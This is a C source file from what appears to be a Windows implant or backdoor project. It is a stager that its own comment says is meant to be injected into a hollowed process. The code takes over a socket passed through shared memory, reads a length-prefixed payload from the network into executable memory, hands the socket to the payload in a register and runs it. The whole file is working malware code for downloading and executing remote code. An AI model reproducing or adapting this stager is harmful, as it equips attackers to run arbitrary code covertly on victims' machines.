//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
// Stager is meant to be injected into hollowed process with a socket passed to it. The sole purpose of the stager is
// to read 4 bytes length from the socket, then read payload of as many bytes as specified in length and execute payload.
//
#include <winsock2.h>
#include <windows.h>
#include <ntdll.h>
#include <stdint.h>
#include "vr-config.h"
#include "../shared/math.h"
#include "../shared/debug.h"

#if _WIN64
static const unsigned mov_rdi_size = 10;
#else
static const unsigned mov_rdi_size = 5;
#endif

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
    LOG_DEBUG("Stager started");
    deterministic_uuid_seed = get_machine_hash();
    WSADATA wsa;
    HANDLE hMapping = 0;
    uint8_t* shared_memory = 0;
    uint8_t* payload = 0;
    int length = 0;
    SOCKET s = INVALID_SOCKET;
    WSAStartup(0x0202, &wsa);

    do
    {
        char mapping_name[51] = "Global\\";
        deterministic_uuid(combine_hash(gts_shared_memory_name, GetCurrentProcessId()), mapping_name + 7);

        HANDLE hMapping = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, mapping_name);
        if (!hMapping)
        {
            LOG_DEBUG("Failed to open mapping %s %d", mapping_name, GetLastError());
            break;
        }

        shared_memory = (uint8_t*)MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0x2000);
        if (!shared_memory)
        {
            LOG_DEBUG("Failed to open shared_memory %d", GetLastError());
            break;
        }

        WSAPROTOCOL_INFOW* protocol_info = (WSAPROTOCOL_INFOW*)(shared_memory + sizeof(long));
        s = WSASocketW(FROM_PROTOCOL_INFO, FROM_PROTOCOL_INFO, FROM_PROTOCOL_INFO, protocol_info, 0, 0);
        int socket_error = WSAGetLastError();

        // Signal that mapping is no longer needed.
        InterlockedExchange((volatile long*)shared_memory, 0);

        UnmapViewOfFile(shared_memory);
        shared_memory = 0;
        CloseHandle(hMapping);
        hMapping = 0;

        if (s == 0 || s == INVALID_SOCKET)
        {
            LOG_DEBUG("Socket error %d", socket_error);
            break;
        }

        // Switch to blocking mode
        u_long mode = 0;
        ioctlsocket(s, FIONBIO, &mode);
        // Set up timeout
        DWORD timeout = 30000;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        if (recv(s, (char*)&length, 4, 0) != 4)
        {
            LOG_DEBUG("Recv size error %d", WSAGetLastError());
            break;
        }
        LOG_DEBUG("Stager size = %d", length);

        // 30 MB is excessive, i know
        if (length > (30 * 1024 * 1024))
        {
            LOG_DEBUG("Recv size unexpected");
            break;
        }

        uint8_t* payload = (uint8_t*)VirtualAlloc(0, length + mov_rdi_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (payload == 0)
        {
            LOG_DEBUG("VirtualAlloc error %d", GetLastError());
            break;
        }

        // Provide socket to the payload in edi/rdi register
    #if _WIN64
        *(WORD*)payload = 0xBF48;
        *(SOCKET*)(payload + 2) = s;
    #else
        *(BYTE*)payload = 0xBF;
        *(SOCKET*)(payload + 1) = s;
    #endif

        // Read rest of the payload
        int received_length = recv(s, (char*)(payload + mov_rdi_size), length, MSG_WAITALL);
        if (received_length != length)
        {
            LOG_DEBUG("Socket error %d", WSAGetLastError());
            break;
        }

        LOG_DEBUG("Executing payload...");
        // Execute payload
        ((void(*)())(payload))();

    } while (0);

    // Reached only on error.
    if (s != INVALID_SOCKET)
        closesocket(s);
    if (payload)
        VirtualFree(payload, length + mov_rdi_size, MEM_RELEASE | MEM_DECOMMIT);
    if (shared_memory)
        UnmapViewOfFile(shared_memory);
    if (hMapping)
        CloseHandle(hMapping);
    WSACleanup();
    ExitProcess(0);
    return 0;

}
